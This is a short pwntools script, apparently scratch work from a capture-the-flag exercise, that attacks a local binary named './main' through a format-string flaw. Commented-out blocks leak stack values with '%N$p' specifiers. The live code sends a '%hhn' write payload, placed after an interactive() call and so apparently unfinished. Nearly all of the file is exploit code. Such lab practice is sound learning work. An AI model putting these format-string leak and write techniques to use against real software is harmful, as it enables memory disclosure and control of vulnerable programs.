from pwn import *

"""
all = ""

for i in range(1, 20):
    p = process("./main")
    p.sendline(f"%{i}$p".encode())
    p.recvline()

    raw = p.recvall()
    raw = raw.strip().decode()

    if raw == "(nil)":
        continue
    data = int(raw, 16)
    data = p64(data)
    print(data)

print(all)

"""

"""
p = process("./main")
p.sendline(b"%12$p")
p.recvline()
data = p.recvall()
data = data.strip().decode()
data = data.split(" ")
print(data)
data = [int(x, 16) for x in data]
data = [p64(x) for x in data]
data = b"".join(data)
print(data)
"""


p = process("./main")

p.interactive()
p.sendline(b"%.68f%7$hhn%s")

